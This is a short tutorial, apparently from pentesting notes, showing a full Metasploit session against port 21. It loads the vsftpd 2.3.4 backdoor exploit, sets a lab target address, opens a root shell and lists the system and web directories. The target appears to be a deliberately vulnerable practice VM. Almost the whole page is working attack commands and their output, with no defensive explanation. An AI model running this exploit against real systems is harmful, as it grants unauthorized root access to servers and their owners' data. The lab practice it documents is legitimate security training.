---
description: Using Metasploit attacking on Port 21
---

# Attacking on Port 21

Once you're strong enough, save the world:

```


msf > search vsftpd
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution


msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):
USE EXP
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(vsftpd_234_backdoor) > EXPLOIT
[-] Unknown command: EXPLOIT.
msf exploit(vsftpd_234_backdoor) > run

[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 3 opened (10.0.2.15:46465 -> 192.168.56.101:6200) at 2018-05-22 04:38:15 +0000

pwd
/
ls -la
total 93
drwxr-xr-x  22 root root  4096 May 21 05:47 .
drwxr-xr-x  22 root root  4096 May 21 05:47 ..
drwxr-xr-x   2 root root  4096 May 13  2012 bin
drwxr-xr-x   4 root root  1024 May 13  2012 boot
lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  14 root root 13480 May 21 03:05 dev
drwxr-xr-x  95 root root  4096 May 21 03:06 etc
drwxr-xr-x   6 root root  4096 Apr 16  2010 home
drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root  4096 May 13  2012 lib
drwx------   2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x   4 root root  4096 Mar 16  2010 media
drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
-rw-------   1 root root  7263 May 21 03:06 nohup.out
drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
dr-xr-xr-x 116 root root     0 May 21 03:05 proc
drwxr-xr-x  13 root root  4096 May 21 03:06 root
drwxr-xr-x   2 root root  4096 May 13  2012 sbin
drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  12 root root     0 May 21 03:05 sys
drwxrwxrwt   6 root root  4096 May 21 06:25 tmp
drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
drwxr-xr-x  15 root root  4096 May 20  2012 var
drwx------   2 root root  4096 May 21 05:47 venkat
lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
cd var
ls -l
total 44
drwxr-xr-x  2 root     root     4096 Sep 24  2009 agentx
drwxr-xr-x  2 root     root     4096 May 21 06:30 backups
drwxr-xr-x 12 root     root     4096 Apr 28  2010 cache
drwxr-xr-x 38 root     root     4096 May 20  2012 lib
drwxrwsr-x  2 root     staff    4096 Apr 15  2008 local
drwxrwxrwt  3 root     root       60 May 21 03:06 lock
drwxr-xr-x 14 root     root     4096 May 21 06:30 log
drwxrwsr-x  2 root     mail     4096 May 21 06:30 mail
drwxr-xr-x  2 root     root     4096 Mar 16  2010 opt
drwxr-xr-x 14 root     root      640 May 21 03:06 run
drwxr-xr-x  5 root     root     4096 Apr 28  2010 spool
drwxrwxrwt  2 root     root     4096 May 20  2012 tmp
drwxr-xr-x 10 www-data www-data 4096 May 20  2012 www
cd www
ls
dav
dvwa
index.php
mutillidae
phpMyAdmin
phpinfo.php
test
tikiwiki
tikiwiki-old
twiki
ls -la  
total 80
drwxr-xr-x 10 www-data www-data  4096 May 20  2012 .
drwxr-xr-x 15 root     root      4096 May 20  2012 ..
drwxrwxrwt  2 root     root      4096 May 20  2012 dav
drwxr-xr-x  8 www-data www-data  4096 May 20  2012 dvwa
-rw-r--r--  1 www-data www-data   891 May 20  2012 index.php
drwxr-xr-x 10 www-data www-data  4096 May 14  2012 mutillidae
drwxr-xr-x 11 www-data www-data  4096 May 14  2012 phpMyAdmin
-rw-r--r--  1 www-data www-data    19 Apr 16  2010 phpinfo.php
drwxr-xr-x  3 www-data www-data  4096 May 14  2012 test
drwxrwxr-x 22 www-data www-data 20480 Apr 19  2010 tikiwiki
drwxrwxr-x 22 www-data www-data 20480 Apr 16  2010 tikiwiki-old
drwxr-xr-x  7 www-data www-data  4096 Apr 16  2010 twiki



```



